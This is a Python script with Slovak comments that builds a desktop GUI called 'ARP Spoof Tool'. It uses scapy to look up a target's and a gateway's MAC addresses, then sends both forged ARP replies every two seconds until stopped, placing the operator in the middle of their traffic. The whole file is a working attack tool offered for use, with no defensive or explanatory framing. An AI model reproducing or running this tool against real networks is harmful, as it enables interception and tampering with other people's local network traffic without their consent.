import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time
from scapy.all import ARP, Ether, send, get_if_list

# Globálna premenná pre zastavenie spoofingu
spoof_running = False

# Funkcia pre filtrovanie rozhraní - zobrazíme len tie relevantné (Wi-Fi, Ethernet)
def get_filtered_interfaces():
    interfaces = get_if_list()
    filtered = [iface for iface in interfaces if ('Wi-Fi' in iface or 'Ethernet' in iface)]
    return filtered if filtered else interfaces  # Ak nič nenájde, vráti všetky

# Funkcia na získanie MAC adresy cieľa pomocou ARP
def get_mac(ip, iface):
    from scapy.layers.l2 import arping
    answered, _ = arping(ip, timeout=2, verbose=False, iface=iface)
    for sent, received in answered:
        return received.hwsrc
    return None

# Funkcia pre ARP spoofing útok
def arp_spoof(target_ip, gateway_ip, iface):
    global spoof_running
    spoof_running = True

    target_mac = get_mac(target_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)

    if not target_mac or not gateway_mac:
        messagebox.showerror("Chyba", "Nepodarilo sa získať MAC adresu cieľa alebo brány.")
        spoof_running = False
        return

    poison_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    poison_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    try:
        while spoof_running:
            send(poison_target, iface=iface, verbose=False)
            send(poison_gateway, iface=iface, verbose=False)
            time.sleep(2)
    except Exception as e:
        messagebox.showerror("Chyba", f"Chyba počas spoofingu: {e}")

# Funkcia na spustenie spoofingu v samostatnom vlákne
def start_spoof():
    global spoof_running
    if spoof_running:
        messagebox.showinfo("Info", "Spoofing už beží.")
        return

    iface = iface_combo.get()
    target_ip = target_ip_entry.get().strip()
    gateway_ip = gateway_ip_entry.get().strip()

    if not iface or not target_ip or not gateway_ip:
        messagebox.showerror("Chyba", "Vyplňte všetky polia.")
        return

    threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip, iface), daemon=True).start()
    messagebox.showinfo("Info", "ARP spoofing spustený.")

# Funkcia na zastavenie spoofingu
def stop_spoof():
    global spoof_running
    spoof_running = False
    messagebox.showinfo("Info", "ARP spoofing zastavený.")

# Vytvorenie GUI
root = tk.Tk()
root.title("ARP Spoof Tool")
root.geometry("450x350")

frame = tk.Frame(root)
frame.pack(padx=20, pady=20, fill="both", expand=True)

# Výber rozhrania
tk.Label(frame, text="Vyberte sieťové rozhranie:").pack(anchor="w")
interfaces = get_filtered_interfaces()
iface_combo = ttk.Combobox(frame, values=interfaces, state="readonly")
iface_combo.pack(fill="x", pady=5)
if interfaces:
    iface_combo.current(0)

# Input pre cieľovú IP
tk.Label(frame, text="Cieľová IP adresa:").pack(anchor="w")
target_ip_entry = tk.Entry(frame)
target_ip_entry.pack(fill="x", pady=5)

# Input pre IP brány (gateway)
tk.Label(frame, text="IP adresa brány (Gateway):").pack(anchor="w")
gateway_ip_entry = tk.Entry(frame)
gateway_ip_entry.pack(fill="x", pady=5)

# Tlačidlá na spustenie a zastavenie spoofingu
btn_frame = tk.Frame(frame)
btn_frame.pack(pady=20, fill="x")

start_btn = tk.Button(btn_frame, text="Spustiť spoofing", bg="green", fg="white", command=start_spoof)
start_btn.pack(side="left", expand=True, fill="x", padx=5)

stop_btn = tk.Button(btn_frame, text="Zastaviť spoofing", bg="red", fg="white", command=stop_spoof)
stop_btn.pack(side="left", expand=True, fill="x", padx=5)

root.mainloop()
